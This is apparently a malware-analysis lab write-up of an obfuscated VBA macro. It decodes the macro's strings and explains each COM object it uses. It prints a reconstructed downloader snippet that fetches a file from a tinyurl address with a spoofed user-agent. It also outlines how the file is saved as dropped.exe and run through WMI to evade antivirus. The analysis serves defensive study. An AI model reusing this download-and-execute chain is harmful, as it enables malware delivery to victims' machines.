We've got strings from a vba script so we need to decode what
information from the script to know what' s going on .

![A screenshot of a computer code AI-generated content may be
incorrect.](images/media/image1.png)

First let us analyze this block .We are solely focusing on the hex
strings as the others are just functions written in gibberish .

![](images/media/image2.png)

As & in between we need to concatenate

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image3.png)

We get a domain with a suspicious directory

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image4.png)

Next block of code

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image5.png)

Then the very next line says environ(temp)/ & referring to the same
function that gave us dropped exe so right form the tinyurl to this temp
everything seems to be related .

What I can deduce right now is that the url is trying to create a temp
file called dropped.exe .Lets move forward .

![A close up of numbers AI-generated content may be
incorrect.](images/media/image6.png)

This confirm its that something is being created .

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image7.png)

**What it actually is**

- It's a **COM object** (a reusable Windows component).

> **COM objects in plain terms**

- **COM** = Component Object Model.

- They're **built-in Windows components** that behave like little tools
  or libraries.

- You don't "install" them every time; they're already there with
  Windows or Microsoft Office.

- A script (VBA, VBS, PowerShell, etc.) can say *"CreateObject(...)\"*
  and Windows hands it back that tool.

> **Why "class objects"**
>
> Each COM object is exposed as a **class** with methods and properties
> you can call.\
> Example:

- MSXML2.ServerXMLHTTP.6.0 → class for making HTTP requests.

- ADODB.Stream → class for writing/reading files/bytes.

- Scripting.FileSystemObject → class for file operations.

<!-- -->

- Part of Microsoft's XML Core Services (MSXML).

- "ServerXMLHTTP" is a special class inside that library.

- The .6.0 at the end just means "version 6 of the library."

------------------------------------------------------------------------

**What it does**

It gives you a way to **make HTTP(S) requests directly from a script**.\
Think of it as:

- A built-in "web browser without the window."

- You can say: *"connect to this URL, send this request, return the
  response."*

------------------------------------------------------------------------

**Why malware uses it**

- No need to ship a downloader --- Windows already has this object.

- It lets them pretend to be a browser (by setting User-Agent).

- It can talk over HTTPS just like Chrome/Edge/IE.

- Works fine from VBA, VBS, or PowerShell.

------------------------------------------------------------------------

**Typical usage in a malicious VBA script**

Set http = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")

\'Open a connection

http.Open \"GET\", \"https://tinyurl.com/g2z2gh6f\", False

\'Set fake headers to look like IE6 on Windows 2000

http.setRequestHeader \"User-Agent\", \"Mozilla/4.0 (compatible; MSIE
6.0; Windows NT 5.0)\"

\'Send the request

http.Send

\'At this point, http.ResponseBody contains the downloaded file bytes

------------------------------------------------------------------------

**What happens next**

- The script takes http.ResponseBody (the raw downloaded data).

- Passes it to another COM object: **ADODB.Stream**.

- ADODB.Stream writes those bytes to disk (e.g. as dropped.exe).

- Then Wscript.Shell or Shell runs that file.

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image8.png)

This is the user agent . Probably a fake one for authenctication.

Now we will answer some questions .

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image9.png)

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image10.png)

All straightforward as we decoded the meaning earlier .

![A screenshot of a computer program AI-generated content may be
incorrect.](images/media/image11.png){![A screenshot of a computer code
AI-generated content may be
incorrect.](images/media/image12.png)![A screenshot of a computer code
AI-generated content may be
incorrect.](images/media/image13.png)

Now we are analyzing the later part of the code .

![A screenshot of a computer AI-generated content may be
incorrect.](images/media/image14.png)

Meaninful text out of it is .

WScript.Shell

winmgmts:\\\\.\\root\\cimv2:Win32_Process

1.  **WScript.Shell**

    - Another COM object.

    - Lets scripts run commands, launch executables, interact with the
      system shell.

    - 

    - Malware often uses it to execute the final payload (dropped.exe
      from before).

2.  **winmgmts:\\\\.\\root\\cimv2:Win32_Process**

    - This is **WMI (Windows Management Instrumentation)**.

    - root\\cimv2 = default WMI namespace on Windows.

    - Win32_Process = the WMI class that represents processes.

    - Meaning: The macro is preparing to **spawn a new process through
      WMI** (instead of calling cmd.exe directly).

------------------------------------------------------------------------

**Why malware uses WMI instead of just cmd.exe**

- **Stealth:** Some AV/EDR solutions flag direct cmd/ShellExecute calls.

- **Bypass restrictions:** WMI can spawn processes under different
  contexts.

- **Persistence or lateral movement:** WMI is commonly abused for remote
  code execution across machines.

This ties back to the rest of the VBA:

- **MSXML2.ServerXMLHTTP.6.0** → downloads the malicious file.

- **ADODB.Stream** → saves it as dropped.exe.

- **WScript.Shell / WMI Win32_Process** → executes that file stealthily.

![A screenshot of a computer screen AI-generated content may be
incorrect.](images/media/image15.png)
